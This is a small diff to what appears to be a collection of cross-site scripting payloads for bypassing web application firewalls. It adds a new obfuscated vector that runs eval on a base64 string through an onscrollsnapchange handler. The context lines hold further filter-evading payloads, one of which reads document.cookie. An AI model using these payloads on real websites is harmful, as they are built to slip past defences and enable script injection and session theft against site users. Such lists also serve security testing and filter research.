@@ -88,6 +88,7 @@ reportError(name , enerror=eval)
 <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+<address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
 ```
 5-Bypass XSS WAF protection using a comment between a JS function name and parameters
 ```
